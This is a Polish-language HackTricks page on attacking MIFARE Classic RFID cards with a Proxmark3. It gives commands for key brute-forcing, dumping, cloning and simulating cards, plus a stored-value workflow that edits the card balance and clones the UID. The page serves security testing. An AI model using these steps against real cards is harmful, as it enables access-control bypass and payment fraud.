# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atakowanie systemów RFID za pomocą Proxmark3

Pierwszą rzeczą, którą musisz zrobić, jest posiadanie [**Proxmark3**](https://proxmark.com) oraz [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attacking MIFARE Classic 1KB

Ma **16 sektorów**, z których każdy ma **4 bloki**, a każdy blok zawiera **16B**. UID znajduje się w sektorze 0, bloku 0 (i nie może być zmieniony).\
Aby uzyskać dostęp do każdego sektora potrzebujesz **2 kluczy** (**A** i **B**), które są zapisane w **bloku 3 każdego sektora** (sector trailer). Sector trailer przechowuje również **bity dostępu**, które określają uprawnienia do **odczytu i zapisu** dla **każdego bloku** przy użyciu tych dwóch kluczy.\
2 klucze mogą być użyte do nadawania uprawnień: odczyt jeśli znasz pierwszy, i zapis jeśli znasz drugi (na przykład).

Można przeprowadzić kilka ataków
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 pozwala wykonywać inne akcje, takie jak **eavesdropping** **Tag to Reader communication**, aby spróbować znaleźć wrażliwe dane. W przypadku tej karty możesz po prostu podsłuchać komunikację i obliczyć użyty klucz, ponieważ **użyte operacje kryptograficzne są słabe**, a znając tekst jawny i szyfrogram możesz go obliczyć (narzędzie `mfkey64`).

#### MiFare Classic szybki przebieg nadużyć kart z przechowywaną wartością
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Uwagi

- `hf mf autopwn` orkiestruje ataki w stylu nested/darkside/HardNested, odzyskuje klucze i tworzy zrzuty w client dumps folder.
- Zapis bloku 0/UID działa tylko na kartach magic gen1a/gen2. Normalne karty Classic mają UID tylko do odczytu.
- Wiele wdrożeń używa Classic "value blocks" lub prostych sum kontrolnych. Upewnij się, że wszystkie zduplikowane/uzupełnione pola i sumy kontrolne są spójne po edycji.

Zobacz metodologię na wyższym poziomie i środki łagodzące w:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems sometimes use **tagi bez marki lub niekomercyjne**. W tym przypadku możesz użyć Proxmark3 do wysłania niestandardowych **raw commands** do tagów.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Mając te informacje możesz spróbować wyszukać informacje o karcie oraz o sposobie komunikacji z nią. Proxmark3 pozwala wysyłać raw commands, na przykład: `hf 14a raw -p -b 7 26`

### Scripts

Oprogramowanie Proxmark3 zawiera wstępnie załadowaną listę **skryptów automatyzujących**, których możesz użyć do wykonywania prostych zadań. Aby pobrać pełną listę, użyj polecenia `script list`. Następnie użyj polecenia `script run`, po którym podajesz nazwę skryptu:
```
proxmark3> script run mfkeys
```
Możesz stworzyć skrypt do **fuzz tag readers** — kopiując dane z **prawidłowej karty**, po prostu napisz **Lua script**, który **losowo zmienia** jeden lub więcej losowych **bytes** i sprawdzi, czy **reader crashes** przy którejkolwiek iteracji.

## Referencje

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
